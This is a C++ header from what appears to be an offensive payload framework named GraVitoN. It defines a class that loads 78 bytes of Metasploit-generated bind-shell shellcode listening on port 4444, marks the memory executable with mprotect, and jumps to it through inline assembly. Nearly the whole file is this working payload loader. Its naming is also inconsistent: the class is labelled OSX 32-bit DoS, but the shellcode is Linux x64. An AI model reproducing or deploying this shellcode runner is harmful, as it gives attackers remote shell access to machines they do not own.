/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Osx32_DoS
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_OSX32_DOS_HEAD_
#define _GVN_PAYLOAD_OSX32_DOS_HEAD_

#include "../gvn_payload.hpp"

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <errno.h>

using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief OSX 32 bit DoS Shell
 *
 * Loads a linux x64 bshell!
 * Successfully tested on 10.6.
 * 
 * @see Payload_Sample
 */
class Payload_Osx32_DoS : public GraVitoN::Bin_Payload
{
protected:
	virtual bool initPayload();
	
public:
    Payload_Osx32_DoS();
    virtual ~Payload_Osx32_DoS();

    virtual bool initialize ( const string &_options );
    virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Osx32_DoS::Payload_Osx32_DoS()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Osx32_DoS::~Payload_Osx32_DoS()
{
    delete payload;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32_DoS::initPayload()
{
   int port = 4444;
   OptParser::getValueAsInt(options, "PORT", port);

	/*
	* linux/x64/shell/bind_tcp - 78 bytes (stage 1)
	* http://www.metasploit.com
	* VERBOSE=false, LPORT=4444, PrependSetresuid=false,
	* PrependSetreuid=false, PrependSetuid=false,
	* PrependChrootBreak=false, AppendExit=false,
	* InitialAutoRunScript=, AutoRunScript=
	*/
	unsigned char buf[] =
	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
	"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
	"\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
	"\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
	"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
	"\x05\xff\xe6";
	
    int buf_len = 78;

    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32_DoS::initialize ( const string &_options )
{
    options = _options;

    Logger::logIt ( "init payload... " );
    initPayload();
    Logger::logItLn ( "done" );

    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32_DoS::run()
{
    // Set Page Permissions
    unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
    if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
        Logger::logIt ( "mprotect failed - errorno: " );
        Logger::logItLn ( errno );

        return false;
    }

    // A Little Delay!
    int _delay = 320;
    while ( _delay > 0 ) {
        --_delay;
    }

    int useless_out = 0;
    Logger::logItLn ( "Jumping..." );
    asm (
        "mov %1, %%ecx;"
        "jmp *%%ecx;"
        : "=r" ( useless_out )
        : "r" ( jumper )
        : "%ecx"
    );
    Logger::logItLn ( "call > done" );

    return true;
}

#endif // _GVN_PAYLOAD_OSX32_DOS_HEAD_
